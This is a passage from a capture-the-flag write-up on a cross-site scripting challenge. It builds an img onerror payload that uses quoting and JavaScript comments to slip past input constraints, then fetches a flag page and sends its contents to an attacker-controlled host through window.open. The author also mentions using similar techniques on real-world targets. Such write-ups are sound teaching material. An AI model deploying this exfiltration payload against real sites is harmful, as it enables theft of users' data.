    <p class="has-line-data" data-line-start="410" data-line-end="411">So this idea didn't work because we cannot insert comments inside html elements. They are not treated as comments but as part of the element so it won't work for our purposes. The next thing I thought of was treating the src attribute like a string so it will consume all the content between and still execute as an error.</p>
    <pre><code class="has-line-data" data-line-start="412" data-line-end="414" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">'list stuff'</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-value">'our code!'</span>&gt;</span>
    </code></pre>
    <p class="has-line-data" data-line-start="414" data-line-end="415">We then can use the same thing for the onerror attribute and combine it with comments to try and achieve code execution. So our payload will look like:</p>
    <pre><code class="has-line-data" data-line-start="417" data-line-end="421" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">'
    '</span><span class="hljs-value">onerror='</span>/*
    */<span class="hljs-attribute">alert</span>(<span class="hljs-attribute">9</span>)'&gt;</span>
    </code></pre>
    <p class="has-line-data" data-line-start="422" data-line-end="423"><img src="./images/basic.png" width=50%></p>
    <h3 class="code-line" data-line-start=425 data-line-end=426><a id="Exploitation_425"></a>Exploitation</h3>
    <p class="has-line-data" data-line-start="426" data-line-end="427">Nice, we got code execution so let's follow this same pattern to build a full payload.</p>
    <pre><code class="has-line-data" data-line-start="429" data-line-end="445" class="language-html"><span class="hljs-tag">&lt;<span class="hljs-title">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">'
'</span><span class="hljs-value">onerror='</span>/*
*/<span class="hljs-attribute">fetch</span>(/*
*/"<span class="hljs-attribute">flag</span>")<span class="hljs-attribute">.</span>/*
*/<span class="hljs-attribute">then</span>(<span class="hljs-attribute">r</span>=&gt;</span>/*
*/r.text()/*
*/).then(/*
*/t=&gt;/*
*/window/*
*/.open(/*
*/"http:"+/*
*/"//my"+/*
*/".ip."+/*
*/"lmao"+/*
*/"/"+t))'&gt;
</code></pre>
    <p class="has-line-data" data-line-start="446" data-line-end="447">Note, we cannot break up Javascript keywords. This is because Javascript comments are parsed as whitespace such that <code>win/**/dow</code> is parsed as <code>win dow</code> which breaks up the keywords and makes them invalid. Either way when we input the payload we'll receive this on the attacker controlled ip.</p>
    <p class="has-line-data" data-line-start="448" data-line-end="449"><img src="./images/resp.png" width=50%></p>
    <p class="has-line-data" data-line-start="451" data-line-end="452">Okay, that is the response we expect so we can now send it to the admin bot and we'll get our response and flag!</p>
    <p class="has-line-data" data-line-start="453" data-line-end="454"><img src="./images/done.png" width=50%></p>
    <h3 class="code-line" data-line-start=455 data-line-end=456><a id="Summary_455"></a>Summary</h3>
    <p class="has-line-data" data-line-start="457" data-line-end="458">This challenge was pretty interesting and it is pretty practical as I've used some similar techniques on some real world targets (new blog post coming soon???). aplet123 made some fun challenges for this CTF so I'm looking forward to playing again next year.</p>
            </p>
        </div>
    </div>
</body>